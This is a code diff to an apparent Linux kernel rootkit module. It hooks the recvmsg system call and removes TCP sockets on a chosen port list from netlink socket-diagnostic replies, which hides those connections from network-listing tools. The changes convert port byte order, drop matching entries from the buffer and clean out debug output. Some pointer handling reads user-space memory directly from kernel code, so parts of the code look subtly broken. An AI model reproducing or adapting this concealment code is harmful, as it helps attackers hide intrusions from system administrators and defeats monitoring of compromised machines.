@@ -55,6 +55,7 @@ static long my_sys_recvmsg(int fd, struct msghdr __user *msg, unsigned flags){
 	struct nlmsghdr * nlh, *nxt; //netlink message header struct
 	struct inet_diag_msg * diag_msg; 
 	int error = 0;
+	unsigned short sport, dport;
 	
 	rcount++;	
 	
@@ -74,35 +75,41 @@ static long my_sys_recvmsg(int fd, struct msghdr __user *msg, unsigned flags){
 	//check if family (important) and protocol match (otherwise the cast might fail at some point?)
 	if(sk->sk_family == AF_NETLINK && sk->sk_protocol == NETLINK_INET_DIAG){ //that's a bingo!
 		mmsg = (struct msghdr * ) kmalloc(lres, GFP_KERNEL);
-		error = copy_from_user(mmsg, msg, lres);
+		memset(mmsg, 0, lres);
 		
-		msglen = lres;
+		error = copy_from_user(mmsg, msg, lres);		
+		if(error > 0) return lres; //copy from user failed, can't access memory
+
+		if(mmsg->msg_iovlen == msg->msg_iovlen){ //prevent us from processing garbage (happens)
 		
-		//if(error > 0) return lres; //copy from user failed, can't access memory
-		
+		msglen = mmsg->msg_iov->iov_len;
+
 		nlh = (struct nlmsghdr *) mmsg->msg_iov->iov_base;
-	
-		printk(KERN_INFO "is that how you say it? No. It's just 'Bingo!'\n");		
 		
 		do{
 			diag_msg = NLMSG_DATA(nlh);
-			if(in_tcplist(diag_msg->id.idiag_sport) || in_tcplist(diag_msg->id.idiag_dport)){
-				printk(KERN_INFO "Bingo! src: %d dest: %d\n", diag_msg->id.idiag_sport,
-										diag_msg->id.idiag_dport);
+			sport = htons(diag_msg->id.idiag_sport);
+			dport = htons(diag_msg->id.idiag_dport);
+	
+			//printk(KERN_INFO "s: %d\n", sport);
 			
+			if(in_tcplist(sport)){ //don't hide target ports...
+			//	printk(KERN_INFO "hiding port %d", sport);
+				
 				lres -= NLMSG_ALIGN((nlh)->nlmsg_len);
 				nxt = NLMSG_NEXT(nlh, msglen);
 				memmove(nlh, nxt, msglen); //shift entries
 			}
-			nlh = NLMSG_NEXT(nlh, msglen);
-			printk(KERN_INFO " %ld\n", msglen);
+			else{
+				nlh = NLMSG_NEXT(nlh, msglen);
+			}
+			//printk(KERN_INFO "---------------------------\n");
 			}while(NLMSG_OK(nlh, msglen));
-		
-		//save return value to suppress warning
-		error = copy_to_user(msg, mmsg, lres);
-		kfree(mmsg); 
-	}
-out:	printk(KERN_INFO "returning %d\n", --rcount);		
+		error = copy_to_user(msg->msg_iov->iov_base, mmsg->msg_iov->iov_base, lres);
+		kfree(mmsg);
+		}
+	} 
+out:	--rcount;
 	return lres;
 }
 
